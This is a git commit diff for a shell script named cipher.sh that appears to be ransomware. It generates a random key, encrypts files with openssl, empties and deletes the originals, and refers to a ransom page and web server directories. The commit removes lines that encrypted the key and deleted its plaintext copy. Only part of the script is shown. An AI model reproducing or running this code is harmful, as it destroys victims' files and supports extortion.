f2af6e9d6774ccefa2b109645c40fef28044765d
skqhfla <83075908+skqhfla@users.noreply.github.com>
2023-12-07 05:32:02 +0900

    Update cipher.sh

--- cipher.sh
+++ cipher.sh
@@ -3,8 +3,6 @@
 LIST=list
 RANSOM=ransom.html
 IMAGE=bg.jpg
-WKEY=whiteKey
-CIPHER=./whiteCipher
 KEY=key
 openssl rand -hex 16 > $KEY
 
@@ -15,8 +13,6 @@ do
 		openssl aes-128-cbc -salt -pass file:"$KEY" -in "$FILE" -out "$FILE.enc" && cat /dev/null > "$FILE" && rm -rf "$FILE"
 	done
 done
-
-"$CIPHER" -key "$WKEY" -in "$KEY" -out "$KEY.enc" | cut -d ' ' -f 2 | head -n 1 > "$KEY.iv" && cat /dev/null > "$KEY" && rm -rf "$KEY"
 
 APACHE=/var/www
 NGINX=/usr/share/nginx
